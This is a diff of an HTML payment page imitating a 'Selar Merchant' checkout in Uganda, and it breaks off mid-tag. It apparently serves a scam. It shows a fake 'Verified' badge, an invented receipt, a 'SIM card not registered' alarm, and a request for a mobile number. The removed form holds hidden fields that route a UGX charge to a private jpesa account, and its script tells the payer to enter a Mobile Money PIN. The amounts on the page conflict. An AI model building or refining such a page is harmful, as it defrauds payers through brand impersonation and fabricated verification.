@@ -3,342 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Payment - Selar</title>
+    <title>Selar Merchant Payment Interface</title>
     <style>
-        /* Reset and Mobile-First Scaling */
-        * { box-sizing: border-box; }
-        body { 
-            background-color: #fcfcfc; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            padding: 10px; 
+        :root {
+            --selar-purple: #5a1a5a;
+            --success-green: #28a745;
+            --error-red: #d9534f;
+            --light-gray: #f4f4f4;
+            --border-color: #e0e0e0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
         }
-        
-        .invoice-card { 
-            width: 100%; 
-            max-width: 400px; 
-            background: white; 
-            text-align: center; 
-            padding-top: 10px; 
+
+        .checkout-wrapper {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            padding: 24px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* Top Header */
+        .status-header {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid var(--border-color);
+            border-radius: 50px;
+            padding: 4px 12px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        .status-dot { color: var(--success-green); margin-right: 6px; font-size: 14px; }
+
+        .brand-logo {
+            background-color: var(--selar-purple);
+            color: white;
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0 auto 12px;
+        }
+
+        .merchant-title { font-size: 18px; font-weight: 800; color: #1a1a1a; margin: 8px 0; }
+        .verified-text { color: var(--success-green); font-size: 14px; font-weight: 500; margin-bottom: 12px; }
+
+        .chips-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .chip {
+            background: #f0f0f0;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            padding: 6px 12px;
+            font-size: 12px;
+            color: #555;
+            cursor: pointer;
         }
 
-        /* Blinking Animations */
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
+        .description { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 24px; padding: 0 10px; }
 
-        @keyframes blink-blue {
-            0% { color: #0000ff; opacity: 1; }
-            50% { color: #0000ff; opacity: 0.3; }
-            100% { color: #0000ff; opacity: 1; }
-        }
-
-        @keyframes blink-green {
-            0% { color: #008000; opacity: 1; }
-            50% { color: #008000; opacity: 0.3; }
-            100% { color: #008000; opacity: 1; }
-        }
-
-        .country-badge { 
-            display: inline-flex; 
-            align-items: center; 
-            border: 1px solid #e0e0e0; 
-            border-radius: 20px; 
-            padding: 4px 16px; 
-            font-size: 13px; 
-            font-weight: 600; 
-            color: #333; 
-            margin-bottom: 25px; 
-        }
-        .status-dot { 
-            height: 10px; 
-            width: 10px; 
-            background-color: #00a651; 
-            border-radius: 50%; 
-            margin-right: 8px; 
-            animation: blink 1.5s infinite; 
-        }
-
-        .logo-circle { width: 70px; height: 70px; background-color: #5a0b4d; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: white; font-family: 'serif'; font-size: 24px; font-style: italic; font-weight: bold; }
-        
-        .title-row { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 15px 0 8px; flex-wrap: wrap; }
-        .title-row h2 { font-size: 20px; margin: 0; color: #000; font-weight: 800; }
-        
-        .verified-badge { 
-            color: #00a651; 
-            font-size: 16px; 
-            display: flex; 
-            align-items: center; 
-            gap: 4px;
-            animation: blink 1.5s infinite; 
-        }
-
-        .action-links { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
-        .btn-pill { background: #f3f3f3; padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #555; text-decoration: none; display: flex; align-items: center; gap: 5px; }
-
-        .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
-
-        /* Realistic Thermal Receipt Section */
-        .image-receipt-box {
-            background: #fff;
-            background-image: radial-gradient(#eee 1px, transparent 0);
-            background-size: 4px 4px;
-            border: 1px solid #ddd;
-            margin: 0 15px 25px;
-            padding: 25px 20px;
+        /* Receipt Card */
+        .receipt-container {
+            background-color: #fafafa;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            padding: 20px;
             text-align: left;
             font-family: 'Courier New', Courier, monospace;
-            font-size: 12px;
-            color: #222;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
             position: relative;
-        }
-        .receipt-header-main { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 2px; }
-        .receipt-line { margin: 6px 0; border-bottom: 1px solid #f0f0f0; padding-bottom: 2px; }
-        .receipt-bold { font-weight: bold; font-size: 14px; }
-        .receipt-center { text-align: center; font-weight: bold; letter-spacing: 1px; }
-        .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 15px; border: 1px solid #d32f2f; padding: 5px; }
-
-        /* Verified Title Style */
-        .id-verified-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 20px;
+            margin-bottom: 24px;
         }
 
-        .id-verified-title {
-            font-weight: bold;
-            font-size: 14px;
-            color: #0000ff;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            animation: blink-blue 1.5s infinite;
-        }
-
-        .star-sign {
-            font-size: 18px;
-            color: #008000;
-            animation: blink-green 1.5s infinite;
-        }
-
-        /* National ID Visual Section */
-        .id-card-visual {
-            width: 92%;
-            margin: 10px auto 10px;
-            aspect-ratio: 1.6 / 1;
-            background: linear-gradient(135deg, #f3d7d7 0%, #e2eff1 50%, #f1def1 100%);
-            border-radius: 12px;
-            border: 1px solid #c0c0c0;
-            position: relative;
-            padding: 12px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            text-align: left;
-            overflow: hidden;
-            color: #1a2a44;
-        }
-        .id-header-text {
-            text-align: center;
-            font-weight: 700;
-            font-size: 13px;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
-            color: #2c3e50;
-        }
-        .id-body {
-            position: relative;
-            z-index: 1;
-            display: grid;
-            grid-template-columns: 75px 1fr 1fr;
-            gap: 2px 10px;
-        }
-
-        /* Passport Photo Replacement with Text */
-        .photo-privacy-area {
-            grid-row: 1 / 6;
-            width: 75px;
-            height: 95px;
-            border: 1px solid #bbb;
-            border-radius: 4px;
-            background-color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 5px;
-            position: relative;
-            overflow: hidden;
-            text-align: center;
-        }
+        .receipt-title { text-align: center; font-weight: bold; font-size: 14px; margin-bottom: 15px; line-height: 1.2; }
+        .receipt-line { display: flex; justify-content: space-between; font-size: 12px; margin: 4px 0; }
+        .receipt-label { color: #444; text-transform: uppercase; }
         
-        .photo-note-small {
-            font-size: 8px;
-            font-weight: bold;
-            color: #555;
-            z-index: 3;
-            line-height: 1.2;
-        }
+        .divider { border-top: 1px dashed #ccc; margin: 15px 0; }
 
-        .map-flag-background {
-            position: absolute;
-            top: 5px;
-            left: 5px;
-            right: 5px;
-            bottom: 5px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Flag-map_of_Uganda.svg/1200px-Flag-map_of_Uganda.svg.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            opacity: 0.2;
-            z-index: 1;
-        }
+        .amount-section { margin-top: 10px; }
+        .amount-label { font-size: 11px; color: #666; font-weight: bold; }
+        .amount-value { font-size: 24px; font-weight: bold; color: #000; }
 
-        .thumb-print-overlay {
-            width: 50%;
-            height: 50%;
-            background-image: url('https://www.svgrepo.com/show/24430/fingerprint.svg');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            position: absolute;
-            z-index: 2;
-            opacity: 0.4;
-        }
-
-        .id-field { margin-bottom: 2px; }
-        .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
-        .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
-        
-        /* Bottom Privacy Disclaimer */
-        .bottom-privacy-note {
-            width: 90%;
-            margin: 0 auto 25px;
+        .warning-alert {
+            border: 1px solid var(--error-red);
+            color: var(--error-red);
+            padding: 10px;
             font-size: 10px;
-            color: #d32f2f;
-            font-weight: bold;
-            line-height: 1.4;
             text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+            line-height: 1.3;
         }
 
-        /* Payment Logic Styles */
-        .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
-        .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
-        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
-        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
-        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
-        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
-        
-        #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
-        .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .footer-labels { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #777; margin-bottom: 10px; }
-        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 10px 15px 20px; }
-        .mtn-mini { border: 1px solid #ffcc00; color: #e6b800; border-radius: 10px; padding: 0 6px; font-weight: bold; font-size: 9px; margin-right: 5px; }
-        .airtel-mini { color: #ff0000; font-weight: bold; font-size: 11px; display: flex; align-items: center; }
+        /* Payment Input */
+        .payment-box {
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: left;
+            background: #fff;
+        }
+
+        .flex-input { display: flex; gap: 8px; margin-bottom: 12px; }
+        input[type="text"] {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+        }
+        .btn-submit {
+            background-color: #00a651;
+            color: white;
+            border: none;
+            padding: 0 20px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .network-info { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #444; }
+        .operator-logos { color: #333; font-weight: bold; }
+
+        .footer-disclaimer { font-size: 10px; color: var(--error-red); margin-top: 20px; line-height: 1.4; text-align: center; }
+        .bottom-credits { 
+            display: flex; 
+            justify-content: space-between; 
+            font-size: 10px; 
+            color: #999; 
+            margin-top: 30px; 
+            border-top: 1px solid #f0f0f0; 
+            padding-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="invoice-card">
-    <div class="country-badge"><span class="status-dot"></span> SELAR MERCHANT PAYMENT🇺🇬</div>
-    <div class="logo-circle">Selar</div>
+<div class="checkout-wrapper">
+    <div class="status-header"><span class="status-dot">●</span> SELAR MERCHANT PAYMENT 🇺🇬</div>
+    
+    <div class="brand-logo">Selar</div>
+    <div class="merchant-title">selar-Merchant-200usd-74,300UGX</div>
+    <div class="verified-text">✔ Verified</div>
 
-    <div class="title-row">
-        <h2>selar-Merchant-200usd-74,300UGX</h2>
-        <div class="verified-badge">✔ Verified</div>
-    </div>
-
-    <div class="action-links">
-        <span class="btn-pill">@selara4</span>
-        <span class="btn-pill">📋 Copy paylink</span>
+    <div class="chips-container">
+        <div class="chip">@selara4</div>
+        <div class="chip">📋 Copy paylink</div>
     </div>
 
     <p class="description">You are paying fx charge for selar-merchant-200usd securely. Payments are protected and your details stay private.</p>
 
-    <div class="image-receipt-box">
-        <div class="receipt-header-main">SELAR MERCHANT TRANSACTION</div>
-        <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
-        <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
-        <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar Merchant Account Number]</div>
-        <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago🇺🇲</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-        <div class="receipt-bold" style="text-decoration: underline;">Mobile Transaction </div>
-        <div class="receipt-line"><strong>MOBILE:</strong>6837633</div>
-        <div class="receipt-line"><strong>NETWORK:</strong> MERCHANT ID</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 18px;">USD 200.00</div>
-        <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
-        <div class="red-status">[SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM]</div>
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR MERCHANT</div>
+    <div class="receipt-container">
+        <div class="receipt-title">SELAR MERCHANT TRANSACTION<br>TRANSACTION - RECEIPT</div>
+        <div style="text-align:center; color:#ccc; letter-spacing: 2px;">****************************</div>
+        
+        <div class="receipt-line"><span class="receipt-label">TYPE:</span> <span>Send Money (Mobile)</span></div>
+        <div class="receipt-line"><span class="receipt-label">ACCOUNT:</span> <span>[Your Account Number]</span></div>
+        <div class="receipt-line"><span class="receipt-label">NAME:</span> <span>Lolikishee USA Chicago 🇺🇸</span></div>
+        <div class="receipt-line"><span class="receipt-label">RECIPIENT ID:</span> <span>SI001234595</span></div>
+        
+        <div style="font-weight: bold; margin: 12px 0 4px; text-decoration: underline; font-size: 12px;">Mobile Transaction</div>
+        <div class="receipt-line"><span class="receipt-label">MOBILE:</span> <span>6837633</span></div>
+        <div class="receipt-line"><span class="receipt-label">NETWORK:</span> <span>MERCHANT ID</span></div>
+
+        <div class="divider"></div>
+
+        <div class="amount-section">
+            <div class="amount-label">TOTAL AMOUNT:</div>
+            <div class="amount-value">USD 200.00</div>
+        </div>
+
+        <div class="warning-alert">
+            [ SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM ]
+        </div>
+        
+        <div style="text-align: center; font-weight: bold; margin-top: 20px; font-size: 18px; letter-spacing: 1px;">
+            SELAR MERCHANT
+        </div>
     </div>
 
     <div class="payment-box">
-        <div id="processing-notice">
-            <div style="font-size: 14px; color: #166534; font-weight: bold;">
-                <span class="loading-spinner"></span> Waiting for PIN prompt...
-            </div>
-            <div style="font-size: 11px; color: #15803d; margin-top: 4px;">Please check your phone and enter your Mobile Money PIN.</div>
+        <div class="flex-input">
+            <input type="text" placeholder="07XXXXXXXX">
+            <button class="btn-submit">Continue</button>
         </div>
-
-        <form id="paymentForm">
-            <input type="hidden" name="ownerid" value="wasswa.lawrence" />
-            <input type="hidden" name="description" value="Credit Note" />
-            <input type="hidden" name="return" value="https://my.jpesa.com" />
-            <input type="hidden" name="cancel" value="https://my.jpesa.com" />
-            <input type="hidden" name="email" value="lolikishee1@gmail.com" />
-            <input type="hidden" name="name" value="loli kishee" />
-            <input type="hidden" name="cur" value="UGX" />
-            <input type="hidden" name="amount" value="66300" />
-
-            <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" title="Please enter a valid 10-digit phone number" />
-                <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
-            </div>
-        </form>
-
-        <div class="footer-labels">
-            <span>Amount: UGX 21,670</span>
-            <div style="display:flex; align-items: center;">
-                <span class="mtn-mini">MTN</span>
-                <span class="airtel-mini">● airtel</span>
-            </div>
-        </div>
-
-    
-        <div style="margin-top: 10px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1);">
-            <p class="id-label-small">PERSON VERIFIED</p>
-            <div style="font-family: cursive; font-size: 11px; margin-top: -2px;">SIM CARD NOT VERIFIEDP</div>
-        </div>
-    </div>
-
-    <div class="bottom-privacy-note">
-        NOTE: Currently Selar merchant system support transactions on Sim Card Verified by Selar Merchant. 
-    </div>\
-
-    <div class="footer-secondary">
-        <span>© 2026 Selar Merchant system</span>
-        <span>256-bit SSL ● Secure</span>
-    </div>
-</div>
-
-<script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault(); 
-        const btn = document.getElementById('submitBtn');
-        const notice = document.getElementById('processing-notice');
-        btn.disabled = true;
-        btn.innerText = "Please wait...";
-        notice.style.display = "block";
-    });
-</script>
-
-</body>
-</html>
+        <div class="network-info">
+            <span>Amount: <b>UGX 21,670</b></span>
+            <span class="operator-
